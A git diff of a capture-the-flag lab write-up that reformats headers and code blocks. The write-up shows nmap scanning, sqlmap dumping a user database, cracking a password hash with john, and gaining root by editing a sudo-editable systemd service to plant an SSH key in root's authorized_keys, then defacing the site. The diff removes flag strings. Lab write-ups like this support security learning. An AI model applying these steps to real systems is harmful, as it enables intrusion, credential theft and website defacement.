@@ -16,6 +16,7 @@ Good luck,
 
 Billy
 
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Mon Feb 15 21:46:34 2021 as: nmap -sC -sV -o nmap/initial -vvv -p 22,80 10.10.112.151
 Nmap scan report for 10.10.112.151
@@ -44,11 +45,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon Feb 15 21:46:48 2021 -- 1 IP address (1 host up) scanned in 13.25 seconds
 ```
 
-#Web server port 80
+# Web server port 80
 There is a login panel, but it does not actually make a POST request action so this is a dead end
 Going to the products page the products are in a sequential ID order and with the presence of sqlmap as a tag in the room lets try and enumerate the database using this
 
-#Enumerating sql server
+# Enumerating sql server
 sqlmap -u http://10.10.112.151/products/1 --dbs
 ```
 [22:10:24] [INFO] the back-end DBMS is MySQL
@@ -67,7 +68,7 @@ available databases [5]:
 [*] sys
 ```
 
-#Dumping duckyinc
+# Dumping duckyinc
 sqlmap -u http://10.10.112.151/products/1 -D duckyinc --dump
 Hidden in the user/"customer" table we see a flag thm{br3ak1ng_4nd_3nt3r1ng}, this turns out to be flag 1
 
@@ -86,7 +87,7 @@ Table: system_user
 ```
 The server-admin hash has fewer rounds and an appealing username so lets go for the lower hanging fruit and try to crack this hash before the others.
 
-#Cracking server-admin hash
+# Cracking server-admin hash
 ```
 john serverAdminHash -w=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -101,11 +102,11 @@ Session completed
 ```
 Since we know the login panel is a deadend lets go ahead and try to ssh.
 
-#Initial foothold
+# Initial foothold
 ssh server-admin@10.10.112.151
 our credentials do in fact work and we find flag2
 
-#Privilege Escalation
+# Privilege Escalation
 ```
 server-admin@duckyinc:~$ sudo -l
 [sudo] password for server-admin:
@@ -117,6 +118,7 @@ User server-admin may run the following commands on duckyinc:
         duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
 ```
 gtfobins provides us a way to edit a service and allow us escalate our privileges
+```
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
@@ -125,31 +127,29 @@ ExecStart=/bin/sh -c "id > /tmp/output"
 WantedBy=multi-user.target' > $TF
 sudo systemctl link $TF
 sudo systemctl enable --now $TF
+```
 
 so we can modify this as follows
+```
 [Service]
 Type=oneshot
 ExecStart=/bin/sh -c "echo 'our rsa key' > /root/.ssh/authorized_keys"
 [Install]
 WantedBy=multi-user.target
+```
 
 Since we can edit the duckyinc.service as such presumably we should then be able to reload the service and have the ability to ssh as root as an authorized identity
-
+```
 sudo systemctl daemon-reload
 sudo systemctl restart duckyinc.service
 
 ssh root@10.10.112.151
+```
+
 And we have successfully escalated to root
 
 There doesn't appear to be a flag, but referencing the mission objectives given the flag hint reminds us that we are to deface the front page of the website so lets go ahead and do that
 
-#Defacing Website
+# Defacing Website
 We navigate to /var/www/duckyinc/templates/index.html and can simply edit the frontpage here
 After editing it we find the final flag has been created in the root directory
-
-#flag 1
-thm{br3ak1ng_4nd_3nt3r1ng}
-#flag 2
-thm{4lm0st_th3re}
-#flag 3
-thm{m1ss10n_acc0mpl1sh3d}
